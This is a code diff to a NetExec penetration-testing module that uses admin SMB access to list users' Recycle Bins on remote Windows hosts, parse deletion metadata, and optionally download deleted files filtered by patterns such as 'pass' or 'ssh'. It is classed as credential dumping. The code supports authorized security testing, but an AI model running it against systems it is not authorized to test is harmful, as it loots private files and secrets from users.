@@ -2,100 +2,135 @@ from os import makedirs
 from nxc.helpers.misc import CATEGORY
 from nxc.paths import NXC_PATH
 from os.path import join, abspath
-from impacket.dcerpc.v5 import rrp
-from impacket.dcerpc.v5.rrp import DCERPCSessionError
-from impacket.examples.secretsdump import RemoteOperations
+from datetime import datetime, timedelta
+import struct
+import re
+from io import BytesIO
+
+# TODO handle reconstructing the original path better when there is no associated metadata file (we are in a subdirectory)
+# TODO handle the struture of downloaded directories better
 
 
 class NXCModule:
-    # Module by @Defte_
-    # Dumps files from recycle bins
+    # Module by @Defte_ & @leDryPotato
+    # Find (and download) files from Recycle Bins
 
     name = "recyclebin"
-    description = "Lists and exports users' recycle bins"
+    description = "Lists (and downloads) files in the Recycle Bin."
     supported_protocols = ["smb"]
+    opsec_safe = True
+    multiple_hosts = True
+    false_positive = [".", "..", "desktop.ini", "S-1-5-18",]
     category = CATEGORY.CREDENTIAL_DUMPING
 
+    def __init__(self, context=None, module_options=None):
+        self.context = context
+        self.module_options = module_options
+
     def options(self, context, module_options):
-        """No options available"""
+        """
+        DOWNLOAD    Download the files in the Recycle Bin (default: False)
+            Example: -o DOWNLOAD=True
+        FILTER      Filter what files you want to download (default: all) based on their original filename (supports regular expressions)
+            Examples: -o FILTER=pass
+                      -o FILTER=ssh
+        """
+        self.download = bool(module_options.get("DOWNLOAD", False))
+        self.filter = module_options.get("FILTER", "all")
+
+    def read_file(self, connection, context, file_path):
+        buf = BytesIO()
+        try:
+            connection.conn.getFile("C$", file_path, buf.write)
+        except Exception as e:
+            if "STATUS_FILE_IS_A_DIRECTORY" in str(e):
+                context.log.debug(f"Couldn't read file {file_path}: {e}")
+            else:
+                context.log.debug(f"Couldn't read file {file_path}: {e}")
+
+        buf.seek(0)
+        return buf.read()
+
+    def convert_filetime_to_datetime(self, filetime):
+        """Convert Windows FILETIME to a readable timestamp rounded to the closest minute."""
+        try:
+            WINDOWS_EPOCH = datetime(1601, 1, 1)  # Windows FILETIME epoch
+
+            timestamp = filetime / 10_000_000  # Convert 100-ns intervals to seconds
+            dt = WINDOWS_EPOCH + timedelta(seconds=timestamp)
+            return dt.replace(microsecond=0)
+        except Exception:
+            return "Conversion Error"
+
+    def process_recycle_bin_directory(self, connection, context, sid_dir, metadata_map, depth=0):
+        """Recursively process the Recycle Bin directory and its subdirectories."""
+        for item in connection.conn.listPath("C$", f"{sid_dir}\\*"):
+            try:
+                if item.get_longname() in self.false_positive:
+                    continue
+
+                item_path = f"{sid_dir}\\{item.get_longname()}"
+                if item.is_directory():
+                    for _ in range(depth, depth + 1):
+                        context.log.highlight(f"{'\t' * (depth + 1)}Found subdirectory: {item_path}")
+
+                    # Recursively process subdirectories
+                    self.process_recycle_bin_directory(connection, context, item_path, metadata_map, depth + 1)
+                else:
+                    # Process files in the directory
+                    # Files in the Recycle Bin have two types of names:
+                    # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$I87021Q.txt
+                    # Or
+                    # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$R87021Q.txt
+                    # $I files are metadata while $R are actual files
+
+                    if item.get_longname().startswith("$I"):
+                        # Process Metadata file ($I) to extract original path and deletion time
+                        data = self.read_file(connection, context, item_path)
+                        if len(data) >= 24:
+                            deletion_time_raw, = struct.unpack("<Q", data[16:24])
+                            deletion_time = self.convert_filetime_to_datetime(deletion_time_raw)
+                            original_path = data[24:].decode("utf-16", errors="ignore").strip("\x00")
+                            match = re.search(r"([a-z]:\\.+)", original_path, re.IGNORECASE)
+                            if match:
+                                original_path = match.group(1)
+                                metadata_map[item.get_longname().replace("$I", "")] = original_path
+                                context.log.highlight(f"\tFile: {item.get_longname()}, Original location: {original_path}, Deletion time: {deletion_time}")
+                    else:
+                        original_path = metadata_map.get(item.get_longname().replace("$R", ""), f"{sid_dir}\\{item.get_longname()}")
+                        # Process actual file ($R)
+                        for _ in range(depth, depth + 1):
+                            context.log.highlight(f"{'\t' * (depth + 1)}File: {item.get_longname()} ({original_path}), size: {item.get_filesize()}KB")
+                        if self.download:
+                            # Would need to access the key in metadata_map that is associated with the current directory we are in to get the original path
+                            if self.filter and self.filter.lower() != "all":
+                                match = re.search(self.filter, original_path, re.IGNORECASE)
+                                if not match:
+                                    context.log.info(f"\tSkipping file {item.get_longname()} ({original_path})")
+                                    continue
+                            context.log.info(f"\tDownloading file {item.get_longname()} from {original_path}")
+                            data = self.read_file(connection, context, item_path)
+                            filename = f"{connection.host}_{original_path}"
+                            export_path = join(NXC_PATH, "modules", "recyclebin")
+                            path = abspath(join(export_path, filename))
+                            makedirs(export_path, exist_ok=True)
+                            try:
+                                with open(path, "wb") as f:
+                                    f.write(data)
+                                context.log.success(f"Recycle Bin file {item.get_longname()} written to: {path}")
+                            except Exception as e:
+                                context.log.fail(f"Failed to write Recycle Bin file to {filename}: {e}")
+            except Exception as e:
+                context.log.debug(f"Error processing item {item.get_longname()}: {e}")
 
     def on_admin_login(self, context, connection):
-        false_positive_users = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
-        found = 0
-        try:
-            remote_ops = RemoteOperations(connection.conn, connection.kerberos)
-            remote_ops.enableRegistry()
+        metadata_map = {}
 
-            for sid_directory in connection.conn.listPath("C$", "$Recycle.Bin\\*"):
-                try:
-                    if sid_directory.get_longname() and sid_directory.get_longname() not in false_positive_users:
+        for directory in connection.conn.listPath("C$", "$Recycle.Bin\\*"):
+            if directory.get_longname() not in self.false_positive and directory.is_directory():
+                # Each directory corresponds to a different user account, the SID identifies the user
+                sid_dir = f"$Recycle.Bin\\{directory.get_longname()}"
+                if (sid_dir is not None):
+                    context.log.highlight(f"Found directory {sid_dir}")
 
-                        # Extracts the username from the SID
-                        reg_handle = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)["phKey"]
-                        key_handle = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{sid_directory.get_longname()}")["phkResult"]
-                        username = None
-                        try:
-                            _, profileimagepath = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "ProfileImagePath\x00")
-                            # Get username and remove embedded null byte
-                            username = profileimagepath.split("\\")[-1].rstrip("\x00")
-                        except rrp.DCERPCSessionError as e:
-                            context.log.debug(f"Couldn't get username from SID {e} on host {connection.host}")
-
-                        # Lists for any file or directory in the recycle bin
-                        spider_folder = f"$Recycle.Bin\\{sid_directory.get_longname()}\\"
-                        paths = connection.spider(
-                            "C$",
-                            folder=spider_folder,
-                            regex=[r"(.*)"],
-                            silent=True
-                        )
-
-                        false_positive = (".", "..", "desktop.ini")
-                        filtered_file_paths = [path for path in paths if not path.endswith(false_positive)]
-                        if filtered_file_paths:
-                            if username is not None:
-                                context.log.highlight(f"CONTENT FOUND {sid_directory.get_longname()} ({username})")
-                            else:
-                                context.log.highlight(f"CONTENT FOUND {sid_directory.get_longname()}")
-
-                            for path in filtered_file_paths:
-                                # Returned path look like:
-                                # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$I87021Q.txt
-                                # Or
-                                # $Recycle.Bin\S-1-5-21-4140170355-2927207985-2497279808-500\/$R87021Q.txt
-                                # $I files are metadata while $R are actual files so we split the path from the SID
-                                # And check that the filename contains $R only to prevent downloading useless stuff
-
-                                if "$R" in path.split(sid_directory.get_longname())[1] and not path.endswith(false_positive):
-                                    # Create the export path
-                                    export_path = join(NXC_PATH, "modules", "recyclebin")
-                                    makedirs(export_path, exist_ok=True)
-
-                                    # Formatting the destination filename
-                                    file_path = path.split("$")[-1].replace("/", "_")
-                                    filename = f"{connection.host}_{username if username else sid_directory.get_longname()}_recyclebin_{file_path}"
-                                    dest_path = abspath(join(export_path, filename))
-                                    try:
-                                        with open(dest_path, "wb+") as file:
-                                            connection.conn.getFile("C$", path, file.write)
-                                    except Exception as e:
-                                        if "STATUS_FILE_IS_A_DIRECTORY" in str(e):
-                                            context.log.debug(f"Couldn't open {dest_path} because of {e}")
-                                        else:
-                                            context.log.fail(f"Failed to write recyclebin file to {filename}: {e}")
-                                    else:
-                                        context.log.highlight(f"\t{dest_path}")
-                                        found += 1
-                except DCERPCSessionError as e:
-                    if "ERROR_FILE_NOT_FOUND" in str(e):
-                        continue
-                    else:
-                        context.log.fail(f"Error opening {sid_directory.get_longname()} on host {connection.host} because of {e}")
-                        continue
-            if found > 0:
-                context.log.highlight(f"Recycle bin's content downloaded to {export_path}")
-        except DCERPCSessionError as e:
-            context.log.exception(e)
-            context.log.fail(f"Error connecting to RemoteRegistry {e} on host {connection.host}")
-        finally:
-            remote_ops.finish()
+                self.process_recycle_bin_directory(connection, context, sid_dir, metadata_map)
